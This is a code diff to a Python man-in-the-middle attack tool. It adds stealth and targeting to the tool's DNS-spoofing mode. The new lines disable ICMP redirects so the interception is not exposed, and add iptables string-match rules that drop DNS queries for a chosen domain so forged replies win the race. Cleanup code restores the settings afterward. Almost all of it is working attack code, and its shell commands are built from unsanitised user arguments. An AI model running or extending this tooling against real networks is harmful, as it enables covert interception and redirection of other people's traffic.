@@ -70,6 +70,14 @@ def main():
     print("[*] Enabling IP Forwarding...")
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
+    # FIX: Disable ICMP Redirects so we don't expose our MITM
+    print("[*] Disabling ICMP Redirects...")
+    os.system("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects")
+    os.system("echo 0 > /proc/sys/net/ipv4/conf/default/send_redirects")
+
+    if args.interface:
+        os.system(f"echo 0 > /proc/sys/net/ipv4/conf/{args.interface}/send_redirects")
+
     print(f"[+] Starting attack in [{args.mode.upper()}]... Press CTRL+C to stop")
 
     try:
@@ -101,7 +109,24 @@ def main():
         # Start DNS Spoofing if enabled
         elif args.mode == "dns":
             # iptables rule to drop DNS requests to win race condition
-            os.system("sudo iptables -A FORWARD -p udp --dport 53 -j DROP")
+            if dns_spoof_all:
+                os.system("sudo iptables -A FORWARD -p udp --dport 53 -j DROP")
+            else:
+                domain_parts = args.target_domain.split('.')
+                # Remove 'www' from the start 
+                if domain_parts[0] == 'www':
+                    domain_parts.pop(0)
+                
+                # Ignore the TLD (last part) if we have enough parts left
+                candidates = domain_parts
+                if len(domain_parts) > 1:
+                    candidates = domain_parts[:-1]
+
+                # Now find the longest unique part from what remains
+                keyword = max(candidates, key=len)
+
+                cmd = f"sudo iptables -A FORWARD -p udp --dport 53 -m string --string '{keyword}' --algo bm -j DROP"
+                os.system(cmd)
             dns_thread = threading.Thread(
                 target=dns.start_dns_spoof,
                 args=(args.target_domain, args.attacker, verbose, dns_spoof_all),
@@ -142,7 +167,21 @@ def main():
         # Disable Interfaces 
         if args.mode == "dns":
             print("[-] Removing DNS DROP rule...")
-            os.system("iptables -D FORWARD -p udp --dport 53 -j DROP")
+            if dns_spoof_all:
+                os.system("iptables -D FORWARD -p udp --dport 53 -j DROP")
+            else:
+                domain_parts = args.target_domain.split('.')
+                if domain_parts[0] == 'www':
+                    domain_parts.pop(0)
+                
+                candidates = domain_parts
+                if len(domain_parts) > 1:
+                    candidates = domain_parts[:-1]
+
+                keyword = max(candidates, key=len)
+
+                cmd = f"iptables -D FORWARD -p udp --dport 53 -m string --string '{keyword}' --algo bm -j DROP"
+                os.system(cmd)
             
             
         elif args.mode == "ssl":
@@ -152,6 +191,13 @@ def main():
 
         # Disable IP Forwarding to return machine to default state
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
+        print("[-] Re-enabling ICMP Redirects...")
+        os.system("echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects")
+        os.system("echo 1 > /proc/sys/net/ipv4/conf/default/send_redirects")
+
+        if args.interface:
+             os.system(f"echo 1 > /proc/sys/net/ipv4/conf/{args.interface}/send_redirects")
         
         print("[+] Cleanup complete. Exiting.")
 
